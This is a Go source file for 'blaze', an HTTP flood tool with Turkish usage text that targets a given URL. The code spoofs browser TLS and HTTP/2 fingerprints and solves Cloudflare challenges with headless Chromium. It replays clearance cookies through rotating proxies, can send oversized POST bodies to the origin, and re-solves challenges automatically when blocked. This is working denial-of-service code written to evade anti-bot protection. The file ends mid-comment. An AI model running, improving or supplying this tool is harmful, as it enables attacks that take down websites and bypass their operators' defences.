package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	gofire "github.com/JSInvasor/Gohttp-clientfingerprintemulateandfastest"
)

// ANSI colors
const (
	white = "\033[37m"
	gray  = "\033[38;5;245m"
	red   = "\033[31m"
	reset = "\033[0m"
)

func main() {
	if len(os.Args) >= 2 && os.Args[1] == "fp" {
		fpURL := "https://tls.peet.ws/api/all"
		if len(os.Args) >= 3 {
			fpURL = os.Args[2]
		}
		runFingerprintCheck(fpURL)
		return
	}
	if len(os.Args) < 4 {
		fmt.Println("kullanim: blaze <url> <sure_sn> <thread> [stream] [method] [proxy|proxy_dosya] [--solve|--solve=N] [--body=BOYUT]")
		fmt.Println()
		fmt.Println("ornek:    ./blaze https://hedef.com 60 64 32")
		fmt.Println("ornek:    ./blaze https://hedef.com 60 40 40 GET --solve")
		fmt.Println("ornek:    ./blaze https://hedef.com 60 40 40 GET proxyler.txt --solve=3   (ilk 3 proxy'nin her birinden ayri clearance; yuk o 3 proxy ile)")
		fmt.Println("ornek:    ./blaze https://hedef.com 60 40 40 POST --body=16k   (origin'e buyuk paket)")
		fmt.Println("ornek:    ./blaze fp                        (her profilin canli JA3/JA4/H2'sini tls.peet.ws'ten basar)")
		os.Exit(1)
	}

	targetURL := os.Args[1]
	if !strings.HasPrefix(targetURL, "http://") && !strings.HasPrefix(targetURL, "https://") {
		targetURL = "https://" + targetURL
	}

	durSec := mustInt(os.Args[2], "sure")
	threads := mustInt(os.Args[3], "thread")

	streams := 32
	method := "GET"
	proxyArg := ""
	solve := false
	solveCount := 1
	bodySize := 0

	posArgs := []string{}
	for _, arg := range os.Args[4:] {
		switch {
		case arg == "--solve":
			solve = true
		case strings.HasPrefix(arg, "--solve="):
			solve = true
			solveCount = mustInt(strings.TrimPrefix(arg, "--solve="), "solve proxy sayisi")
		case strings.HasPrefix(arg, "--body="):
			bodySize = mustBytes(strings.TrimPrefix(arg, "--body="))
		default:
			posArgs = append(posArgs, arg)
		}
	}
	if len(posArgs) >= 1 {
		streams = mustInt(posArgs[0], "stream")
	}
	if len(posArgs) >= 2 {
		method = strings.ToUpper(posArgs[1])
	}
	if len(posArgs) >= 3 {
		proxyArg = posArgs[2]
	}

	// A body only ships on methods that carry one. If the user asked for a
	// body but left the method at GET, promote to POST so the bytes actually
	// reach the origin.
	if bodySize > 0 && method == "GET" {
		method = "POST"
	}

	var sessions []solvedSession
	if solve {
		var err error
		sessions, err = solveSessions(targetURL, proxyArg, solveCount)
		if err != nil {
			fmt.Fprintf(os.Stderr, "%shata: challenge cozulemedi: %v%s\n", red, err, reset)
			os.Exit(1)
		}
	}

	run(targetURL, durSec, threads, streams, method, proxyArg, sessions, solve, bodySize)
}

// solvedSession is one solved Cloudflare clearance bound to a specific exit IP.
// cf_clearance is tied to the IP + UA + JA3/JA4 that earned it, so the load must
// replay each clearance through the SAME proxy that solved it. proxyURL is the
// canonical proxy URL (with credentials) suitable for WithProxy; empty means the
// solve ran directly (no proxy / VPS IP).
type solvedSession struct {
	proxyURL string
	cookies  string
	ua       string
}

type solverResult struct {
	Status    string `json:"status"`
	URL       string `json:"url"`
	UserAgent string `json:"user_agent"`
	Cookies   string `json:"cookies"`
	Error     string `json:"error"`
}

// solveSessions solves the Cloudflare challenge and returns one session per
// exit IP we'll load through. cf_clearance is IP-bound, so each session's
// cookie MUST be replayed through the same proxy that earned it.
//
//   - proxy file given: solve through the first n proxies (in parallel), one
//     session each. Proxies that fail to clear are dropped; at least one must
//     succeed.
//   - single proxy URL or no proxy: a single session (n is forced to 1), solved
//     through that proxy (or directly), matching the IP the load will use.
func solveSessions(targetURL, proxyArg string, n int) ([]solvedSession, error) {
	if n < 1 {
		n = 1
	}

	// No proxy file: one solve, through the single cmdline proxy if any.
	if !isProxyFile(proxyArg) {
		var pu *url.URL
		if proxyArg != "" {
			if parsed, e := url.Parse(proxyArg); e == nil {
				pu = parsed
			}
		}
		cookies, ua, err := solveCFChallengeVia(targetURL, pu)
		if err != nil {
			return nil, err
		}
		return []solvedSession{{proxyURL: proxyArg, cookies: cookies, ua: ua}}, nil
	}

	// Proxy file: solve through the first n proxies.
	pr, err := gofire.NewProxyRotatorFromFile(proxyArg)
	if err != nil {
		return nil, fmt.Errorf("proxy dosyasi yuklenemedi: %w", err)
	}
	urls := pr.ProxyURLs()
	if len(urls) == 0 {
		return nil, fmt.Errorf("proxy dosyasi bos")
	}
	if n > len(urls) {
		n = len(urls)
	}
	targets := urls[:n]
	fmt.Printf("%s%d proxy uzerinden challenge cozuluyor (paralel)...%s\n", gray, n, reset)

	type res struct {
		s   solvedSession
		err error
	}
	results := make([]res, n)
	var wg sync.WaitGroup
	for i := 0; i < n; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			pu, e := url.Parse(targets[i])
			if e != nil {
				results[i] = res{err: e}
				return
			}
			cookies, ua, errSolve := solveCFChallengeVia(targetURL, pu)
			results[i] = res{s: solvedSession{proxyURL: targets[i], cookies: cookies, ua: ua}, err: errSolve}
		}(i)
	}
	wg.Wait()

	var sessions []solvedSession
	for i, r := range results {
		if r.err != nil {
			fmt.Fprintf(os.Stderr, "%sproxy #%d clearance alinamadi: %v%s\n", red, i+1, r.err, reset)
			continue
		}
		sessions = append(sessions, r.s)
	}
	if len(sessions) == 0 {
		return nil, fmt.Errorf("hicbir proxy icin clearance alinamadi (%d denendi)", n)
	}
	fmt.Printf("%s%d/%d proxy icin clearance alindi%s\n", white, len(sessions), n, reset)
	return sessions, nil
}

// solveCFChallengeVia solves the challenge, routing the headless Chromium
// through proxyURL when non-nil. cf_clearance is then bound to that proxy's IP.
func solveCFChallengeVia(targetURL string, proxyURL *url.URL) (cookies string, userAgent string, err error) {
	fmt.Printf("cloudflare challenge cozuluyor...\n")

	solverPath := findSolver()
	if solverPath == "" {
		return "", "", fmt.Errorf("solver/index.js bulunamadi")
	}
	if _, errStat := os.Stat("solver/node_modules"); os.IsNotExist(errStat) {
		return "", "", fmt.Errorf("solver/node_modules bulunamadi")
	}

	// 90s ceiling: human navigation + challenge solve can legitimately take
	// 30-60s on slower targets, especially when CF re-issues the challenge.
	ctx, cancel := context.WithTimeout(context.Background(), 90*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, "node", solverPath, targetURL, "75")
	cmd.Stderr = os.Stderr
	// Route the solver's Chromium through the proxy so cf_clearance is bound to
	// the same exit IP the load will replay it from. Chrome's --proxy-server
	// rejects embedded credentials, so the scheme://host:port goes in
	// SOLVER_PROXY and any user:pass goes in SOLVER_PROXY_USER/PASS (the solver
	// applies them via CDP page.authenticate).
	if proxyURL != nil && proxyURL.Host != "" {
		env := os.Environ()
		scheme := proxyURL.Scheme
		if scheme == "" {
			scheme = "http"
		}
		env = append(env, "SOLVER_PROXY="+scheme+"://"+proxyURL.Host)
		if proxyURL.User != nil {
			env = append(env, "SOLVER_PROXY_USER="+proxyURL.User.Username())
			if pw, ok := proxyURL.User.Password(); ok {
				env = append(env, "SOLVER_PROXY_PASS="+pw)
			}
		}
		cmd.Env = env
	}
	// Put node + every chromium child in their own process group so we can
	// kill the WHOLE tree on timeout. Without Setpgid, exec.CommandContext
	// only kills the immediate node process - chromium children survive as
	// orphans and keep eating CPU/RAM.
	cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
	// On context cancel, send SIGKILL to the entire process group (-pid).
	cmd.Cancel = func() error {
		if cmd.Process == nil {
			return nil
		}
		return syscall.Kill(-cmd.Process.Pid, syscall.SIGKILL)
	}
	cmd.WaitDelay = 5 * time.Second // grace window for graceful close after Cancel
	output, errCmd := cmd.Output()
	if errCmd != nil {
		return "", "", fmt.Errorf("solver calistirilamadi: %w", errCmd)
	}

	// The solver prints its result as a single JSON line on stdout, but
	// puppeteer / chrome-launcher and friends occasionally bleed non-JSON text
	// onto stdout too (e.g. a launcher warning starting "Your ..."), which made
	// a whole-buffer Unmarshal fail with a useless "invalid character 'Y'"
	// instead of surfacing the real error. Parse the last JSON object line.
	jsonLine := lastJSONLine(output)
	if jsonLine == nil {
		return "", "", fmt.Errorf("solver ciktisi okunamadi: cikti icinde JSON yok:\n%s", string(output))
	}

	var result solverResult
	if errJSON := json.Unmarshal(jsonLine, &result); errJSON != nil {
		return "", "", fmt.Errorf("solver ciktisi okunamadi: %w", errJSON)
	}

	// Strict status check. Treating any non-empty cookie jar as success is a
	// trap: the no_clearance case still harvests __cf_bm, so a full UAM target
	// that never issued cf_clearance would print "cozuldu!" and then 403 the
	// whole run. Only status=="ok" (cf_clearance present) is a real solve.
	switch result.Status {
	case "ok":
		// real cf_clearance — fall through
	case "no_clearance":
		return "", "", fmt.Errorf("cf_clearance alinamadi (challenge gecilemedi — IP reputation / UAM). status=no_clearance")
	case "error":
		return "", "", fmt.Errorf("%s", result.Error)
	default:
		return "", "", fmt.Errorf("beklenmeyen solver durumu: %s", result.Status)
	}
	if result.Cookies == "" {
		return "", "", fmt.Errorf("cookie bos (status: %s)", result.Status)
	}

	fmt.Printf("%schallenge cozuldu!%s\n", white, reset)
	return result.Cookies, result.UserAgent, nil
}

// lastJSONLine returns the last stdout line that is a valid JSON object,
// tolerating dependency noise printed around the solver's single JSON result.
func lastJSONLine(out []byte) []byte {
	lines := bytes.Split(out, []byte("\n"))
	for i := len(lines) - 1; i >= 0; i-- {
		line := bytes.TrimSpace(lines[i])
		if len(line) == 0 || line[0] != '{' {
			continue
		}
		if json.Valid(line) {
			return line
		}
	}
	return nil
}

// runFingerprintCheck prints each browser profile's live JA3/JA4 + HTTP/2
// (Akamai) fingerprint as observed by a fingerprint echo service. Use it to
// confirm gofire's emulation matches a real browser (e.g. the one the solver
// drives) before trusting a cf_clearance replay.
func runFingerprintCheck(fpURL string) {
	profiles := []struct {
		name string
		prof gofire.BrowserProfile
	}{
		{"Firefox151", gofire.Firefox151},
		{"Chrome148", gofire.Chrome148},
		{"SafariIOS18", gofire.SafariIOS18},
	}
	fmt.Printf("%sfingerprint kaynagi: %s%s\n", gray, fpURL, reset)
	for _, pr := range profiles {
		c, err := gofire.Emulate(pr.prof)
		if err != nil {
			fmt.Printf("%s%s: emulate hatasi: %v%s\n", red, pr.name, err, reset)
			continue
		}
		var body string
		var status int
		var lastErr error
		for attempt := 0; attempt < 2; attempt++ {
			ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
			resp, errReq := c.DoWithContext(ctx, "GET", fpURL, nil, nil)
			if errReq != nil {
				cancel()
				lastErr = errReq
				continue
			}
			status = resp.StatusCode()
			body, lastErr = resp.Text()
			resp.Close()
			cancel()
			if lastErr == nil && body != "" {
				break
			}
		}
		c.Close()

		if lastErr != nil {
			fmt.Printf("%s%s: hata (status=%d): %v%s\n", red, pr.name, status, lastErr, reset)
			continue
		}

		var d struct {
			TLS struct {
				JA3Hash string `json:"ja3_hash"`
				JA4     string `json:"ja4"`
			} `json:"tls"`
			HTTP2 struct {
				Akamai string `json:"akamai_fingerprint"`
			} `json:"http2"`
		}
		if errJSON := json.Unmarshal([]byte(body), &d); errJSON != nil {
			fmt.Printf("%s%s: parse edilemedi (status=%d, len=%d): %v | ham: %.160s%s\n", red, pr.name, status, len(body), errJSON, body, reset)
			continue
		}
		fmt.Printf("%s%s%s (status=%d)\n  ja4=%s\n  ja3_hash=%s\n  h2=%s\n", white, pr.name, reset, status, d.TLS.JA4, d.TLS.JA3Hash, d.HTTP2.Akamai)
	}
}

func findSolver() string {
	for _, p := range []string{"solver/index.js", "./solver/index.js"} {
		if _, err := os.Stat(p); err == nil {
			return p
		}
	}
	return ""
}

type clientGroup struct {
	name      string
	tag       string // Ch, FF, SF
	proxyURL  string // proxy this group's clearance is bound to ("" = direct); used by auto-refresh
	clients   []*gofire.Client
	pipelines []*gofire.Pipeline
	templates []*http.Request
}

func (cg *clientGroup) Close() {
	for _, p := range cg.pipelines {
		p.Close()
	}
	for _, c := range cg.clients {
		c.Close()
	}
}

func (cg *clientGroup) ActiveConnections() int64 {
	var total int64
	for _, c := range cg.clients {
		total += c.ActiveConnections()
	}
	return total
}

func (cg *clientGroup) updateCookies(newCookies string) {
	for i, tmpl := range cg.templates {
		// Clone the template and set new cookie - atomic swap, no race.
		newTmpl := tmpl.Clone(tmpl.Context())
		newTmpl.Header.Set("Cookie", newCookies)
		cg.templates[i] = newTmpl
		cg.pipelines[i].SetTemplate(newTmpl)
	}
}

// browserLabel maps tag to full display name
var browserLabel = map[string]string{
	"Ch": "Chrome 148",
	"FF": "Firefox 151",
	"SF": "Safari iOS 18",
}

// classifyErr turns a raw error string into a short, actionable reason.
// Handshake failures in particular get broken down by *why* they failed —
// the generic "tls handshake failed" hid whether the cause was a slow proxy
// (timeout), a proxy dropping the tunnel (reset/EOF), a MITM proxy (cert),
// or a non-tunneling proxy (CONNECT failed).
func classifyErr(errMsg string) string {
	lc := strings.ToLower(errMsg)
	switch {
	case strings.Contains(lc, "connect failed") || strings.Contains(lc, "connect "):
		// Proxy refused/failed the CONNECT — show the proxy's status line.
		return trimErr(errMsg, "proxy CONNECT failed: ")
	case strings.Contains(lc, "i/o timeout") || strings.Contains(lc, "deadline exceeded") || strings.Contains(lc, "timeout"):
		if strings.Contains(lc, "handshake") || strings.Contains(lc, "server hello") {
			return "tls handshake timeout (slow/dead proxy)"
		}
		return "timeout (slow/dead proxy)"
	case strings.Contains(lc, "certificate") || strings.Contains(lc, "x509"):
		return "tls cert error (MITM/transparent proxy?)"
	case strings.Contains(lc, "eof") || strings.Contains(lc, "reset") || strings.Contains(lc, "broken pipe"):
		return "tls handshake: tunnel dropped by proxy"
	case strings.Contains(lc, "server hello") || strings.Contains(lc, "handshake"):
		// Some other handshake-stage failure — keep the real detail.
		return trimErr(errMsg, "tls handshake: ")
	case strings.Contains(lc, "connection refused"):
		return "connection refused"
	case strings.Contains(lc, "no route to host"):
		return "no route to host (dead proxy)"
	default:
		return trimErr(errMsg, "")
	}
}

func trimErr(errMsg, prefix string) string {
	if len(errMsg) > 200 {
		errMsg = errMsg[:200] + "..."
	}
	return prefix + errMsg
}

// formatTestResult returns the impersonate line for a browser test.
func formatTestResult(tag string, statusCode int, err error) string {
	label := browserLabel[tag]
	if label == "" {
		label = tag
	}

	if err != nil {
		return fmt.Sprintf("%sImpersonate %s %s>%s %s%s%s", white, label, gray, reset, red, classifyErr(err.Error()), reset)
	}
	return fmt.Sprintf("%sImpersonate %s %s>%s %s%d%s", white, label, gray, reset, white, statusCode, reset)
}

func run(targetURL string, durSec, threads, streams int, method, proxyArg string, sessions []solvedSession, solveEnabled bool, bodySize int) {
	runtime.GOMAXPROCS(runtime.NumCPU())

	// Pre-build the POST body once. The same buffer is shared (read-only) by
	// every client's template via GetBody, so there's no per-request alloc.
	var bodyBytes []byte
	if bodySize > 0 {
		bodyBytes = make([]byte, bodySize)
		// urlencoded form shape: "f=AAAA..." so Content-Type matches a real
		// browser form POST. Guard the prefix bytes for tiny sizes.
		for i := range bodyBytes {
			bodyBytes[i] = 'A'
		}
		if len(bodyBytes) >= 2 {
			bodyBytes[0] = 'f'
			bodyBytes[1] = '='
		}
		fmt.Printf("%sbody modu: %s %d byte/request (origin'e buyuk paket)%s\n",
			gray, method, bodySize, reset)
	}

	// No artificial cap — use thread count directly so the VPS decides the ceiling.
	totalTargetClients := threads
	if totalTargetClients < 1 {
		totalTargetClients = 1
	}

	// Scale connection pools with workload. 0 = unlimited active connections.
	idlePerHost := threads * streams
	if idlePerHost < 256 {
		idlePerHost = 256
	}

	usingProxy := proxyArg != ""

	reqTimeout := 10 * time.Second
	dialTO := 8 * time.Second
	tlsTO := 8 * time.Second
	if usingProxy {
		reqTimeout = 30 * time.Second
		dialTO = 15 * time.Second
		tlsTO = 15 * time.Second
	}

	baseOpts := []gofire.Option{
		gofire.WithTimeout(reqTimeout),
		gofire.WithTLSHandshakeTimeout(tlsTO),
		gofire.WithDialTimeout(dialTO),
		gofire.WithMaxIdleConnsPerHost(idlePerHost),
		gofire.WithMaxIdleConns(0),
		gofire.WithMaxConnsPerHost(0),
		gofire.WithDNSCacheTTL(30 * time.Minute),
		gofire.WithIdleConnTimeout(120 * time.Second),
		gofire.WithMaxRedirects(3),
		gofire.WithWriteBufferSize(128 * 1024),
		gofire.WithReadBufferSize(128 * 1024),
	}

	browserReferers := map[string]string{
		"safari":  "https://www.google.com/search?client=safari&channel=iphone_bm",
		"chrome":  "https://www.google.com/",
		"firefox": "https://duckduckgo.com/",
	}

	// groups holds the per-"client group" pipelines. workersPerClient and
	// proxyCount are shared with the banner/feeder setup below, so declare them
	// before the mode branch.
	var groups []*clientGroup
	var workersPerClient int
	proxyCount := 0

	if len(sessions) > 0 {
		// --- Solve mode: one cf_clearance per exit IP ----------------------
		// Each session carries a clearance bound to a specific proxy IP + UA.
		// We build a group of Chrome clients per session, every client pinned to
		// that session's proxy and replaying that session's cookie — so the
		// clearance is always presented from the IP that earned it. Replaying a
		// single clearance across many different proxy IPs (the old behavior)
		// got it re-challenged instantly; this keeps cookie↔IP coherent.
		clientsPerSession := totalTargetClients / len(sessions)
		if clientsPerSession < 1 {
			clientsPerSession = 1
		}
		totalClients := clientsPerSession * len(sessions)
		workersPerClient = (threads * streams) / totalClients
		if workersPerClient < 1 {
			workersPerClient = 1
		}

		groups = make([]*clientGroup, len(sessions))
		for si, sess := range sessions {
			if sess.proxyURL != "" {
				proxyCount++
			}
			cg := &clientGroup{name: "chrome", tag: "Ch", proxyURL: sess.proxyURL}
			parsed := parseCookieHeader(sess.cookies)
			for i := 0; i < clientsPerSession; i++ {
				clientOpts := make([]gofire.Option, 0, len(baseOpts)+3)
				clientOpts = append(clientOpts, baseOpts...)
				clientOpts = append(clientOpts, gofire.WithReferer(browserReferers["chrome"]))
				if sess.ua != "" {
					clientOpts = append(clientOpts, gofire.WithUserAgent(sess.ua))
				}
				if sess.proxyURL != "" {
					clientOpts = append(clientOpts, gofire.WithProxy(sess.proxyURL))
				}
				c, err := gofire.Emulate(gofire.Chrome148, clientOpts...)
				if err != nil {
					fmt.Fprintf(os.Stderr, "%shata: client olusturulamadi: %v%s\n", red, err, reset)
					os.Exit(1)
				}
				if len(parsed) > 0 {
					_ = c.SetCookies(targetURL, parsed)
				}
				tmpl, err := c.PrepareRequest(method, targetURL)
				if err != nil {
					fmt.Fprintf(os.Stderr, "%shata: template olusturulamadi: %v%s\n", red, err, reset)
					os.Exit(1)
				}
				if sess.cookies != "" {
					tmpl.Header.Set("Cookie", sess.cookies)
				}
				if bodyBytes != nil {
					attachBody(tmpl, bodyBytes, targetURL)
				}
				p := c.NewPipeline(workersPerClient)
				p.SetTemplate(tmpl)
				cg.clients = append(cg.clients, c)
				cg.pipelines = append(cg.pipelines, p)
				cg.templates = append(cg.templates, tmpl)
			}
			groups[si] = cg
		}
	} else {
		// --- Load-only mode: 3 browser profiles, optional proxy file -------
		//
		//   single proxy URL on cmdline -> WithProxy on every client
		//   proxy file                  -> one sticky primary proxy per client,
		//                                  backed by a SHARED rotator so a dead
		//                                  proxy fails over to a live one (and
		//                                  recovers after cooldown). Every client
		//                                  still prefers a distinct primary, so
		//                                  the whole list is exercised.
		var rotator *gofire.ProxyRotator
		if usingProxy {
			if isProxyFile(proxyArg) {
				pr, err := gofire.NewProxyRotatorFromFile(proxyArg)
				if err != nil {
					fmt.Fprintf(os.Stderr, "%shata: proxy dosyasi yuklenemedi: %v%s\n", red, err, reset)
					os.Exit(1)
				}
				if pr.Count() == 0 {
					fmt.Fprintf(os.Stderr, "%shata: proxy dosyasi bos%s\n", red, reset)
					os.Exit(1)
				}
				pr.SetCooldown(15 * time.Second) // snappier recovery under load
				rotator = pr
				proxyCount = pr.Count()
			} else {
				baseOpts = append(baseOpts, gofire.WithProxy(proxyArg))
			}
		}

		clientBudget := totalTargetClients
		if rotator != nil {
			clientBudget = rotator.Count()
		}

		safariClients := clientBudget * 4 / 10
		chromeClients := clientBudget * 3 / 10
		firefoxClients := clientBudget - safariClients - chromeClients
		if safariClients < 2 {
			safariClients = 2
		}
		if chromeClients < 1 {
			chromeClients = 1
		}
		if firefoxClients < 1 {
			firefoxClients = 1
		}
		browsers := []struct {
			name    string
			tag     string
			profile gofire.BrowserProfile
			clients int
		}{
			{"firefox", "FF", gofire.Firefox151, firefoxClients},
			{"chrome", "Ch", gofire.Chrome148, chromeClients},
			{"safari", "SF", gofire.SafariIOS18, safariClients},
		}

		totalClients := 0
		for _, bs := range browsers {
			totalClients += bs.clients
		}
		workersPerClient = (threads * streams) / totalClients
		if workersPerClient < 1 {
			workersPerClient = 1
		}

		// Global cursor so each client across browser groups gets a distinct
		// sticky primary proxy. With clientBudget == proxy count the assignment
		// is 1:1; failover to live backups is handled by the shared rotator.
		proxyIdx := 0
		groups = make([]*clientGroup, len(browsers))
		for bi, bs := range browsers {
			cg := &clientGroup{name: bs.name, tag: bs.tag}
			for i := 0; i < bs.clients; i++ {
				clientOpts := make([]gofire.Option, 0, len(baseOpts)+2)
				clientOpts = append(clientOpts, baseOpts...)
				clientOpts = append(clientOpts, gofire.WithReferer(browserReferers[bs.name]))
				c, err := gofire.Emulate(bs.profile, clientOpts...)
				if err != nil {
					fmt.Fprintf(os.Stderr, "%shata: %s client olusturulamadi: %v%s\n", red, bs.name, err, reset)
					os.Exit(1)
				}
				if rotator != nil {
					c.SetProxyRotator(rotator.Pinned(proxyIdx))
					proxyIdx++
				}
				tmpl, err := c.PrepareRequest(method, targetURL)
				if err != nil {
					fmt.Fprintf(os.Stderr, "%shata: template olusturulamadi: %v%s\n", red, err, reset)
					os.Exit(1)
				}
				if bodyBytes != nil {
					attachBody(tmpl, bodyBytes, targetURL)
				}
				p := c.NewPipeline(workersPerClient)
				p.SetTemplate(tmpl)
				cg.clients = append(cg.clients, c)
				cg.pipelines = append(cg.pipelines, p)
				cg.templates = append(cg.templates, tmpl)
			}
			groups[bi] = cg
		}
	}
	defer func() {
		for _, cg := range groups {
			cg.Close()
		}
	}()

	// Test one client per browser. With a proxy file in use this only samples
	// len(groups) of N proxies (one per browser group), so a single failed
	// test line doesn't mean the run will fail — it just means *that one*
	// proxy is bad. The load test continues with all clients regardless.
	if proxyCount > 0 {
		sampled := len(groups)
		rest := proxyCount - sampled
		if rest < 0 {
			rest = 0
		}
		fmt.Printf("%s%d proxy yuklendi (test asagidaki %d proxy'i ornekliyor — geri kalan %d proxy yine de calisir)%s\n",
			gray, proxyCount, sampled, rest, reset)
	}
	testTimeout := 15 * time.Second
	if proxyCount > 0 {
		// Proxies often need 5-10s just for CONNECT; 30s gives a fair test.
		testTimeout = 30 * time.Second
	}
	// The connectivity banner always probes with GET: its job is to confirm we
	// can reach and TLS-handshake the target with the browser fingerprint, not
	// to exercise the load method. Promoting it to POST (when --body is set)
	// made a target-side POST rejection — a WAF/405/RST or an IP ban on an
	// unexpected POST — surface as a misleading "connection refused" on the
	// banner, as if the client itself were dead. The real POST+body request is
	// probed separately below so its result is shown plainly.
	for _, cg := range groups {
		testCtx, testCancel := context.WithTimeout(context.Background(), testTimeout)
		resp, testErr := cg.clients[0].DoWithContext(testCtx, "GET", targetURL, nil, nil)
		testCancel()
		if testErr != nil {
			fmt.Println(formatTestResult(cg.tag, 0, testErr))
		} else {
			fmt.Println(formatTestResult(cg.tag, resp.StatusCode(), nil))
			resp.Close()
		}
	}

	// When the load ships a body, probe the actual POST+body request once per
	// browser. A failure here (while the GET line above is green) means the
	// target rejects the POST itself — the connection is fine. This keeps the
	// banner honest instead of blaming the client for a refused POST.
	if bodyBytes != nil {
		for _, cg := range groups {
			if len(cg.templates) == 0 {
				continue
			}
			label := browserLabel[cg.tag]
			if label == "" {
				label = cg.tag
			}
			probeCtx, probeCancel := context.WithTimeout(context.Background(), testTimeout)
			resp, probeErr := cg.clients[0].FastDo(probeCtx, cg.templates[0])
			probeCancel()
			if probeErr != nil {
				fmt.Printf("%sPOST %s %db %s>%s %s%s%s\n",
					white, label, len(bodyBytes), gray, reset, red, classifyErr(probeErr.Error()), reset)
			} else {
				fmt.Printf("%sPOST %s %db %s>%s %s%d%s\n",
					white, label, len(bodyBytes), gray, reset, white, resp.StatusCode(), reset)
				resp.Close()
			}
		}
	}

	// Pre-warm silently
	warmCtx, warmCancel := context.WithTimeout(context.Background(), 10*time.Second)
	for _, cg := range groups {
		for _, c := range cg.clients {
			_ = c.PreConnect(warmCtx, targetURL, 4)
		}
	}
	warmCancel()

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(durSec)*time.Second)
	defer cancel()

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigCh
		cancel()
	}()

	var (
		totalSent   atomic.Int64
		totalFailed atomic.Int64
		errMu       sync.Mutex
		recentErrs  []string
		errCountMap sync.Map
		recent403   atomic.Int64
		recentTotal atomic.Int64
		refreshing  atomic.Bool
	)

	onResult := func(resp *gofire.Response, err error, latency time.Duration) {
		totalSent.Add(1)
		if err != nil {
			totalFailed.Add(1)

			errStr := err.Error()
			if strings.Contains(errStr, "context canceled") {
				return
			}
			if len(errStr) > 200 {
				errStr = errStr[:200]
			}
			if _, loaded := errCountMap.LoadOrStore(errStr, &atomic.Int64{}); !loaded {
				errMu.Lock()
				if len(recentErrs) < 10 {
					recentErrs = append(recentErrs, errStr)
				}
				errMu.Unlock()
			}
			if val, ok := errCountMap.Load(errStr); ok {
				val.(*atomic.Int64).Add(1)
			}
		} else if resp != nil {
			recentTotal.Add(1)
			if resp.StatusCode() == 403 {
				recent403.Add(1)
			}
		}
	}

	for _, cg := range groups {
		for _, p := range cg.pipelines {
			p.OnResult = onResult
		}
	}

	var feedWg sync.WaitGroup
	feedPipeline := func(pipeline *gofire.Pipeline) {
		defer feedWg.Done()
		for {
			select {
			case <-ctx.Done():
				return
			default:
			}
			pipeline.FireAndForget(ctx, method, targetURL, nil, nil)
		}
	}

	// Scale feeders with worker count so the job channel never starves.
	feedersPerPipeline := workersPerClient / 8
	if feedersPerPipeline < 4 {
		feedersPerPipeline = 4
	}
	for _, cg := range groups {
		for _, p := range cg.pipelines {
			for i := 0; i < feedersPerPipeline; i++ {
				feedWg.Add(1)
				go feedPipeline(p)
			}
		}
	}

	// Auto-refresh: when 403 rate spikes, re-solve and rotate cookies.
	if solveEnabled {
		go func() {
			ticker := time.NewTicker(5 * time.Second)
			defer ticker.Stop()
			for {
				select {
				case <-ctx.Done():
					return
				case <-ticker.C:
					total := recentTotal.Load()
					count403 := recent403.Load()
					recentTotal.Store(0)
					recent403.Store(0)

					if total < 50 {
						continue
					}
					rate := float64(count403) / float64(total)
					if rate < 0.80 {
						continue
					}
					if !refreshing.CompareAndSwap(false, true) {
						continue
					}

					// Re-solve each group through its OWN proxy so the fresh
					// clearance stays bound to the IP that group loads from.
					// A failure on one group leaves its old cookie in place.
					for _, cg := range groups {
						var pu *url.URL
						if cg.proxyURL != "" {
							if parsed, e := url.Parse(cg.proxyURL); e == nil {
								pu = parsed
							}
						}
						newCookies, _, errSolve := solveCFChallengeVia(targetURL, pu)
						if errSolve != nil {
							continue
						}
						cg.updateCookies(newCookies)
					}
					refreshing.Store(false)
				}
			}
		}()
	}

	// RPS stats
	startTime := time.Now()
	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		var lastSent int64
		var peakRPS int64

		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				sent := totalSent.Load()
				elapsed := time.Since(startTime).Seconds()
				rps := sent - lastSent
				lastSent = sent
				if rps > peakRPS {
					peakRPS = rps
				}
				fmt.Printf("\r%ssent:%d rps:%d peak:%d %.0fs%s   ",
					white, sent, rps, peakRPS, elapsed, reset)
			}
		}
	}()

	feedWg.Wait()
	fmt.Println()

	// Only show errors on stop
	errMu.Lock()
	if len(recentErrs) > 0 {
		fmt.Println()
		for _, e := range recentErrs {
			count := int64(0)
			if val, ok := errCountMap.Load(e); ok {
				count = val.(*atomic.Int64).Load()
			}
			fmt.Printf("%s[%dx] %s%s\n", red, count, e, reset)
		}
	}
	errMu.Unlock()
}

func parseCookieHeader(raw string) []*http.Cookie {
	header := http.Header{}
	header.Add("Cookie", raw)
	req := http.Request{Header: header}
	return req.Cookies()
}

func isProxyFile(s string) bool {
	if strings.Contains(s, "://") {
		return false
	}
	if _, err := os.Stat(s); err == nil {
		return true
	}
	return strings.HasSuffix(s, ".txt") || strings.HasSuffix(s, ".list") || strings.HasSuffix(s, ".csv")
}

func mustInt(s, name string) int {
	v, err := strconv.Atoi(s)
	if err != nil || v <= 0 {
		fmt.Fprintf(os.Stderr, "%shata: gecersiz %s: %s%s\n", red, name, s, reset)
		os.Exit(1)
	}
	return v
}

// mustBytes parses a size like "512", "16k", "2m" into a byte count.
func mustBytes(s string) int {
	s = strings.TrimSpace(strings.ToLower(s))
	mult := 1
	switch {
	case strings.HasSuffix(s, "k"):
		mult = 1024
		s = strings.TrimSuffix(s, "k")
	case strings.HasSuffix(s, "m"):
		mult = 1024 * 1024
		s = strings.TrimSuffix(s, "m")
	}
	v, err := strconv.Atoi(s)
	if err != nil || v <= 0 {
		fmt.Fprintf(os.Stderr, "%shata: gecersiz --body boyutu: %s (ornek: --body=16k)%s\n", red, s, reset)
		os.Exit(1)
	}
	return v * mult
}

// attachBody wires a fixed body into a template request so FastDo can replay
// it. GetBody hands a fresh reader to every send (the shallow template copy
// shares one Body that would otherwise EOF after the first request). We also
// set the headers a real browser sends on a form POST — Content-Type,
// Content-Length (via ContentLength), and Origin — all of which already have
// ordered slots in the per-browser HeaderOrder, so the fingerprint stays valid.
